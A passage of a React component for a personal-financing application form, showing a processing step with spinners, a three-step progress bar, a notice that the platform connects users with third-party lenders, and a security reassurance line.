            <ArrowRight className="ml-2 w-5 h-5 inline" />
          </button>
        </div>
        
        <div className="mt-4 text-center text-sm text-gray-500">
          <p>Both buttons will be enabled after you provide your signature and accept agreement</p>
        </div>
      </div>
    </div>
  )

  const renderStep3 = () => (
    <div className="max-w-2xl mx-auto text-center">
      <div className="w-20 h-20 bg-primary-100 rounded-full flex items-center justify-center mx-auto mb-6 animate-pulse-slow">
        <div className="w-10 h-10 border-4 border-primary-500 border-t-transparent rounded-full animate-spin"></div>
      </div>
      <h2 className="text-2xl font-bold text-gray-900 mb-4">Processing Your Request</h2>
      <p className="text-gray-600 mb-8">
        Reviewing your information and matching you with available financial options...
      </p>
      
      <div className="space-y-3">
        <div className="flex items-center justify-center space-x-2">
          <CheckCircle className="w-5 h-5 text-green-500" />
          <span className="text-gray-700">Information received</span>
        </div>
        <div className="flex items-center justify-center space-x-2">
          <div className="w-5 h-5 border-2 border-primary-500 border-t-transparent rounded-full animate-spin"></div>
          <span className="text-gray-700">Searching available options...</span>
        </div>
        <div className="flex items-center justify-center space-x-2">
          <div className="w-5 h-5 border-2 border-gray-300 rounded-full"></div>
          <span className="text-gray-400">Preparing your summary</span>
        </div>
      </div>
    </div>
  )

  return (
    <div className="min-h-screen bg-gray-50 py-12">
      <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8">
        {/* Platform Notice */}
        <div className="bg-blue-50 border border-blue-200 rounded-xl p-4 mb-8">
          <p className="text-blue-800 text-sm text-center">
            We are a platform that connects users with third-party lenders and financial providers. Your application will be reviewed by our network of financial partners.
          </p>
          <p className="text-sm text-gray-500 text-center max-w-2xl mx-auto">
              We are not a direct lender. We connect users with independent providers.
            </p>
        </div>
        {/* Progress Bar */}
        <div className="mb-12">
          <div className="flex items-center justify-center space-x-4">
            <div className={`flex items-center ${currentStep >= 1 ? 'text-primary-600' : 'text-gray-400'}`}>
              <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold ${
                currentStep >= 1 ? 'bg-primary-600 text-white' : 'bg-gray-300'
              }`}>
                1
              </div>
              <span className="ml-2 font-medium">Your Info</span>
            </div>
            <div className={`w-16 h-1 ${currentStep >= 2 ? 'bg-primary-600' : 'bg-gray-300'}`}></div>
            <div className={`flex items-center ${currentStep >= 2 ? 'text-primary-600' : 'text-gray-400'}`}>
              <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold ${
                currentStep >= 2 ? 'bg-primary-600 text-white' : 'bg-gray-300'
              }`}>
                2
              </div>
              <span className="ml-2 font-medium">Verification</span>
            </div>
            <div className={`w-16 h-1 ${currentStep >= 3 ? 'bg-primary-600' : 'bg-gray-300'}`}></div>
            <div className={`flex items-center ${currentStep >= 3 ? 'text-primary-600' : 'text-gray-400'}`}>
              <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold ${
                currentStep >= 3 ? 'bg-primary-600 text-white' : 'bg-gray-300'
              }`}>
                3
              </div>
              <span className="ml-2 font-medium">Processing</span>
            </div>
          </div>
        </div>

        {/* Main Content */}
        <div className="bg-white rounded-2xl shadow-lg p-8">
          {currentStep === 1 && renderStep1()}
          {currentStep === 2 && !showAgreement && renderStep2()}
          {showAgreement && renderAgreementStep()}
          {currentStep === 3 && renderStep3()}
        </div>

        {/* Security Note */}
        <div className="mt-8 text-center text-sm text-gray-500">
          <div className="flex items-center justify-center space-x-2">
            <Shield className="w-4 h-4" />
            <span>Your information is secure and encrypted</span>
          </div>
        </div>
      </div>
    </div>
  )
}

export default PersonalFinancing
